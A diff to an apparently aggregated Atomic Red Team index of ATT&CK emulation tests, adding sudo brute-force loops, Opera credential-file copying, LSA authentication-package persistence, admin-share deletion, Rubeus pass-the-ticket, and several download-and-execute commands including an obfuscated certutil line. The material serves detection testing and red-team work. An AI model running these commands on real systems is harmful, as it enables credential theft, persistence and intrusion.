@@ -863,11 +863,11 @@ credential-access:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name} -UseBasicParsing
+          Invoke-WebRequest #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1110.004:
@@ -1407,7 +1407,9 @@ credential-access:
           Set-Location -path "#{file_path}\Sysinternals";
           ./accesschk.exe -accepteula .;
         cleanup_command: 'Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction
-          Ignore'
+          Ignore
+
+'
         name: powershell
     - name: Search macOS Safari Cookies
       auto_generated_guid: c1402f7b-67ca-43a8-b5f3-3143abedc01b
@@ -1483,6 +1485,45 @@ credential-access:
         cleanup_command: |
           Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore
           Remove-Item -Path "$env:temp\Login Data For Account" -Force -ErrorAction Ignore
+    - name: Simulating access to Opera Login Data
+      auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
+      description: "Simulates an adversary accessing encrypted credentials from Opera
+        web browser's login database. \n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Opera must be installed
+
+'
+        prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
+          -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
+          Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $installer = "$env:temp\OperaStandaloneInstaller.exe"
+          Invoke-WebRequest -OutFile $env:temp\OperaStandaloneInstaller.exe https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
+          Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
+          Start-Sleep -s 180
+          Stop-Process -Name "opera"
+      - description: 'Opera login data file must exist
+
+'
+        prereq_command: if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login
+          Data") {exit 0} else {exit 1}
+        get_prereq_command: 'New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login
+          Data" -ItemType File
+
+'
+      executor:
+        name: powershell
+        command: 'Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data"
+          -Destination $env:temp
+
+'
+        cleanup_command: 'Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction
+          Ignore
+
+'
   T1552.002:
     technique:
       created: '2020-02-04T12:58:40.678Z'
@@ -4256,9 +4297,9 @@ credential-access:
         drive_letter:
           description: Drive letter to source VSC (including colon)
           type: String
-          default: 'C:'
+          default: C:\
       executor:
-        command: "(gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')\n"
+        command: "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n"
         name: powershell
         elevation_required: true
     - name: Create Symlink to Volume Shadow Copy
@@ -4671,7 +4712,7 @@ credential-access:
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
-          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
           if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
             Move-Item $binpath "#{gsecdump_exe}"
           }
@@ -5103,7 +5144,8 @@ credential-access:
       - description: 'AzureAD module must be installed.
 
 '
-        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
 
 '
         get_prereq_command: 'Install-Module -Name AzureAD -Force
@@ -5130,6 +5172,92 @@ credential-access:
             }
           }
           Write-Host "End of bruteforce"
+    - name: SUDO brute force Debian
+      auto_generated_guid: 464b63e8-bf1f-422e-9e2c-2aa5080b6f9a
+      description: "Brute force the password of a local user account which is a member
+        of the sudo'ers group on a Debian based Linux distribution.  \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if running on a Debian based machine.
+
+'
+        prereq_command: |
+          if grep -iq "debian\|ubuntu\|kali" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+          if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
+          if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+          if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+        get_prereq_command: 'apt-get update && apt-get install -y openssl sudo
+
+'
+      executor:
+        elevation_required: true
+        command: |
+          useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password) target
+          su target
+
+          PASSWORDS=(one two three password five); \
+              touch /tmp/file; \
+              for P in ${PASSWORDS[@]}; do \
+                  date +"%b %d %T"; \
+                  sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+                  echo "exit: $?"; \
+                  if grep -q "root" /tmp/file; then \
+                      echo "FOUND: sudo => $P"; break; \
+                  else \
+                      echo "TRIED: $P"; \
+                  fi; \
+                  sleep 2; \
+              done; \
+              rm /tmp/file
+        cleanup_command: 'userdel target
+
+'
+        name: sh
+    - name: SUDO brute force Redhat
+      auto_generated_guid: b72958a7-53e3-4809-9ee1-58f6ecd99ade
+      description: "Brute force the password of a local user account which is a member
+        of the sudo'ers group on a Redhat based Linux distribution.  \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if running on a Redhat based machine.
+
+'
+        prereq_command: |
+          if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "Redhat"; else echo "NOT Redhat"; exit 1; fi
+          if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
+          if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+          if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+        get_prereq_command: 'yum -y update && yum install -y openssl sudo
+
+'
+      executor:
+        elevation_required: true
+        command: |
+          useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target
+          su target
+
+          PASSWORDS=(one two three password five); \
+              touch /tmp/file; \
+              for P in ${PASSWORDS[@]}; do \
+                  date +"%b %d %T"; \
+                  sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+                  echo "exit: $?"; \
+                  if grep -q "root" /tmp/file; then \
+                      echo "FOUND: sudo => $P"; break; \
+                  else \
+                      echo "TRIED: $P"; \
+                  fi; \
+                  sleep 2; \
+              done; \
+              rm /tmp/file
+        cleanup_command: 'userdel target
+
+'
+        name: sh
   T1555.005:
     technique:
       external_references:
@@ -5408,7 +5536,8 @@ credential-access:
       - description: 'AzureAD module must be installed.
 
 '
-        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
 
 '
         get_prereq_command: 'Install-Module -Name AzureAD -Force
@@ -8193,11 +8322,11 @@ collection:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name} -UseBasicParsing
+          Invoke-WebRequest #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1074:
@@ -11165,7 +11294,26 @@ privilege-escalation:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1547.002
+    atomic_tests:
+    - name: Authentication Package
+      auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
+      description: |
+        Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
+        After a reboot, Notepad.exe will be executed as child process of lsass.exe.
+        Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
+        [Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
+        cleanup_command: |
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+          rm -force C:\windows\system32\package.dll
+        name: powershell
+        elevation_required: true
   T1547:
     technique:
       id: attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf
@@ -19190,7 +19338,7 @@ privilege-escalation:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -19220,7 +19368,7 @@ privilege-escalation:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -28693,9 +28841,9 @@ defense-evasion:
       auto_generated_guid: 8b34a448-40d9-4fc3-a8c8-4bb286faf7dc
       description: |
         forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.
-        [Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)
+        [Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)
         "This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe"
-        Upon execution calc.exe will be opened
+        Upon execution calc.exe will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -28704,9 +28852,9 @@ defense-evasion:
           type: String
           default: calc.exe
       executor:
-        command: |
-          forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
-          forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
+        command: 'forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
+
+'
         name: command_prompt
     - name: Indirect Command Execution - conhost.exe
       auto_generated_guid: cf3391e0-b482-4b02-87fc-ca8362269b29
@@ -31945,6 +32093,43 @@ defense-evasion:
           Remove-SmbShare -Name #{share_name}
           Remove-FileShare -Name #{share_name}
         name: powershell
+    - name: Disable Administrative Share Creation at Startup
+      auto_generated_guid: 99c657aa-ebeb-4179-a665-69288fdd12b8
+      description: "Administrative shares are hidden network shares created by Microsoft’s
+        Windows NT operating systems that grant system administrators \nremote access
+        to every disk volume on a network-connected system. These shares are automatically
+        created at started unless they have been\npurposefully disabled and is done
+        in this Atomic test. As Microsoft puts it, \"Missing administrative shares
+        typically \nindicate that the computer in question has been compromised by
+        malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f
+        cleanup_command: |
+          reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /f
+          reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /f
+        name: command_prompt
+        elevation_required: true
+    - name: Remove Administrative Shares
+      auto_generated_guid: 4299eff5-90f1-4446-b2f3-7f4f5cfd5d62
+      description: "Administrative shares are hidden network shares created by Microsoft’s
+        Windows NT operating systems that grant system administrators \nremote access
+        to every disk volume on a network-connected system. As Microsoft puts it,
+        “Missing administrative shares typically \nindicate that the computer in question
+        has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: for %i in (C$ IPC$ ADMIN$) do net share %i /delete
+        cleanup_command: |
+          net share ADMIN$ /UNLIMITED >nul 2>&1
+          net share C$=C:\ >nul 2>&1
+          net share IPC$ >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1027:
     technique:
       object_marking_refs:
@@ -32259,22 +32444,23 @@ defense-evasion:
       - windows
       input_arguments:
         remote_file:
-          description: URL of file to copy
+          description: URL of file to download
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
         local_path:
-          description: Local path to place file
+          description: Local path/filename to save the dowloaded file to
           type: Path
           default: Atomic-license.txt
       executor:
-        command: 'cmd /c certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file}
-          #{local_path}
+        steps: |
+          1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.
 
-'
-        cleanup_command: 'del #{local_path} >nul 2>&1
 
-'
-        name: command_prompt
+            certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file} #{local_path}
+
+
+          2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.
+        name: manual
   T1218.008:
     technique:
       id: attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071
@@ -32876,6 +33062,74 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1556.002:
     technique:
       external_references:
@@ -34882,7 +35136,7 @@ defense-evasion:
       executor:
         command: |
           cp /bin/sh /tmp/crond;
-          /tmp/crond
+          echo 'sleep 5' | /tmp/crond
         cleanup_command: 'rm /tmp/crond
 
 '
@@ -35498,43 +35752,6 @@ defense-evasion:
           sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko
           sudo depmod -a
         name: sh
-        elevation_required: true
-    - name: Windows Signed Driver Rootkit Test
-      auto_generated_guid: 8e4e1985-9a19-4529-b4b8-b7a49ff87fae
-      description: "This test exploits a signed driver to execute code in Kernel.\nThis
-        example was curated from a blog that utilizes puppetstrings.exe with the vulnerable
-        (signed driver) capcom.sys. \nThe capcom.sys driver may be found on github.
-        A great reference is here: http://www.fuzzysecurity.com/tutorials/28.html\nSHA1
-        C1D5CF8C43E7679B782630E93F5E6420CA1749A7\nWe leverage the work done here:\nhttps://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html\nThe
-        hash of our PoC Exploit is\nSHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441\nThis
-        will simulate hiding a process.\n"
-      supported_platforms:
-      - windows
-      input_arguments:
-        driver_path:
-          description: Path to a vulnerable driver
-          type: Path
-          default: C:\Drivers\driver.sys
-        puppetstrings_path:
-          description: Path of puppetstrings.exe
-          type: Path
-          default: PathToAtomicsFolder\T1014\bin\puppetstrings.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'puppetstrings.exe must exist on disk at specified location (#{puppetstrings_path})
-
-'
-        prereq_command: 'if (Test-Path #{puppetstrings_path}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1014/bin/puppetstrings.exe"
-          -OutFile "#{puppetstrings_path}"
-
-'
-      executor:
-        name: command_prompt
-        command: "#{puppetstrings_path} #{driver_path}\n"
         elevation_required: true
   T1564.006:
     technique:
@@ -37451,6 +37668,21 @@ defense-evasion:
           detected''; fi;
 
 '
+    - name: Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)
+      auto_generated_guid: 4a41089a-48e0-47aa-82cb-5b81a463bc78
+      description: "Windows Management Instrumentation(WMI) objects contain system
+        information which helps to detect virtualization. This test will get the model
+        and manufacturer of the machine to determine if it is a virtual machine, such
+        as through VMware or VirtualBox. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"
+          $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"
+          if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
   T1542.001:
     technique:
       id: attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada
@@ -40047,7 +40279,7 @@ persistence:
         xll_url:
           description: url of the file HelloWorldXll.xll
           type: Url
-          default: https://https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.006/bin/HelloWorldXll.xll?raw=true
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/HelloWorldXll.xll
         local_file:
           description: name of the xll file
           type: Path
@@ -40166,7 +40398,8 @@ persistence:
       - description: 'AzureAD module must be installed.
 
 '
-        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
 
 '
         get_prereq_command: 'Install-Module -Name AzureAD -Force
@@ -40245,7 +40478,8 @@ persistence:
       - description: 'AzureAD module must be installed.
 
 '
-        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
 
 '
         get_prereq_command: 'Install-Module -Name AzureAD -Force
@@ -40948,7 +41182,26 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1547.002
+    atomic_tests:
+    - name: Authentication Package
+      auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
+      description: |
+        Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
+        After a reboot, Notepad.exe will be executed as child process of lsass.exe.
+        Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
+        [Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
+        cleanup_command: |
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+          rm -force C:\windows\system32\package.dll
+        name: powershell
+        elevation_required: true
   T1197:
     technique:
       id: attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7
@@ -48908,7 +49161,7 @@ persistence:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -48938,7 +49191,7 @@ persistence:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -52869,10 +53122,10 @@ discovery:
 
 '
         name: sh
-    - name: List Google Chrome Bookmarks on Windows with powershell
+    - name: List Google Chrome / Opera Bookmarks on Windows with powershell
       auto_generated_guid: faab755e-4299-48ec-8202-fc7885eb6545
       description: |
-        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.
         Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
@@ -55900,6 +56153,72 @@ discovery:
       executor:
         command: "#{adfind_path} -sc dclist\n"
         name: command_prompt
+    - name: Remote System Discovery - ip neighbour
+      auto_generated_guid: 158bd4dd-6359-40ab-b13c-285b9ef6fa25
+      description: "Use the ip neighbour command to display the known link layer (ARP
+        table) addresses for hosts sharing the same network segment. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip neighbour show
+
+'
+        name: sh
+    - name: Remote System Discovery - ip route
+      auto_generated_guid: 1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1
+      description: "Use the ip route command to display the kernels routing tables.
+        \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip route show
+
+'
+        name: sh
+    - name: Remote System Discovery - ip tcp_metrics
+      auto_generated_guid: 6c2da894-0b57-43cb-87af-46ea3b501388
+      description: "Use the ip tcp_metrics command to display the recent cached entries
+        for IPv4 and IPv6 source and destination addresses. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip tcp_metrics show |grep --invert-match "^127\."
+
+'
+        name: sh
   T1518.001:
     technique:
       id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
@@ -56269,6 +56588,21 @@ discovery:
           detected''; fi;
 
 '
+    - name: Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)
+      auto_generated_guid: 4a41089a-48e0-47aa-82cb-5b81a463bc78
+      description: "Windows Management Instrumentation(WMI) objects contain system
+        information which helps to detect virtualization. This test will get the model
+        and manufacturer of the machine to determine if it is a virtual machine, such
+        as through VMware or VirtualBox. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"
+          $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"
+          if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
   T1082:
     technique:
       object_marking_refs:
@@ -62625,6 +62959,9 @@ execution:
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
+        cleanup_command: 'Stop-Process -name mshta
+
+'
     - name: Potentially Unwanted Applications (PUA)
       auto_generated_guid: 02f35d62-9fdc-4a97-b899-a5d9a876d295
       description: 'The Potentially Unwanted Applications (PUA) protection feature
@@ -62654,9 +62991,9 @@ execution:
         command: |
           Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
           & "#{pua_file}"
-        cleanup_command: 'Remove-Item #{pua_file} -ErrorAction Ignore
-
-'
+        cleanup_command: |
+          Stop-Process -name PotentiallyUnwanted
+          Remove-Item #{pua_file} -ErrorAction Ignore
     - name: Office Generic Payload Download
       auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
       description: |
@@ -64655,7 +64992,7 @@ execution:
 '
       executor:
         elevation_required: false
-        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calender ''*:0/1''
+        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
           /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -64685,7 +65022,7 @@ execution:
 '
       executor:
         elevation_required: true
-        command: 'systemd-run --unit=Atomic-Red-Team --on-calender ''*:0/1'' /bin/sh
+        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
           -c ''echo "$(date) $(whoami)" >>/tmp/log''
 
 '
@@ -66105,6 +66442,74 @@ lateral-movement:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
